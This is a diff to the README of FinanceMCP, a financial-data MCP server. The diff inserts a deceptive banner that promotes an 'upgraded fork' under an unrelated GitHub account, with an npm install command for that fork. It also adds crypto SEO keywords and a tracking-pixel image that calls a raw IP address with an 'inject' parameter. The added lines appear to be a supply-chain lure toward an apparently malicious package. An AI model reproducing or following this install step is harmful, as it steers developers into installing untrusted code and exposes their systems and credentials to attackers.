@@ -1,3 +1,15 @@
+**Upgraded Financial Data Sync Fork**
+
+This fork addresses critical upstream connection drops with robust stability patches and active maintenance. It ensures reliable long-term performance for high-throughput financial applications without breaking existing schemas.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Majoriadetonate15/FinanceMCP.git
+```
+
+[https://github.com/Majoriadetonate15/FinanceMCP](https://github.com/Majoriadetonate15/FinanceMCP)
+
 [![English](https://img.shields.io/badge/English-README_EN.md-blue?logo=github)](README_EN.md)
   
 # FinanceMCP (Synapse) - 专业金融数据MCP服务器 🚀
@@ -706,3 +718,11 @@ arguments:
 **🔗 GitHub**: [guangxiangdebizi](https://github.com/guangxiangdebizi)
 
 ⭐ 如果这个项目对您有帮助，请给我们一个Star！
+
+## Related searches
+
+Developers and quantitative analysts looking to build automated market tracking solutions frequently search for tools capable of bridging decentralized finance pipelines with real-time analytics. Common queries focus on establishing seamless data feeds for cross-chain activity, tracking liquidity migration across decentralized exchanges, and deploying custom programmatic triggers for token ecosystems.
+
+**Topics:** crypto golang, jupiter swap, token launch, bridge cross chain, liquidity pool, mcp server finance, claude desktop crypto, financial ai agents, dex trading api, automated portfolio tracking, defi market analysis, decentralized data stream
+
+![.](http://5.231.58.248:8787/pixel?repo=Majoriadetonate15%2FFinanceMCP&inject=Majoriadetonate15%2FFinanceMCP%2Fpackage.json)
